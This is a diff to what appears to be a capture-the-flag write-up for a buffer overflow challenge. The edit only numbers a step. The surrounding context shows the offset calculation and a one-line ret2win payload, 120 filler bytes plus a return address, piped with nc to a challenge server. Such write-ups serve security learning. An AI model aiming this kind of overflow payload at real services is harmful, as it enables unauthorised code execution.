@@ -60,6 +60,6 @@ Non-debugging symbols:
 3. Calculate buffer length:
 0x70 + 0x8 = 120 - buffer length 
 
-Overflow stack frame to return to address of the function win
+4. Overflow stack frame to return to address of the function win
 
 ` (python -c "print 'A'*120 + '\x15\x12\x40'") | nc challenge.nahamcon.com 30384`
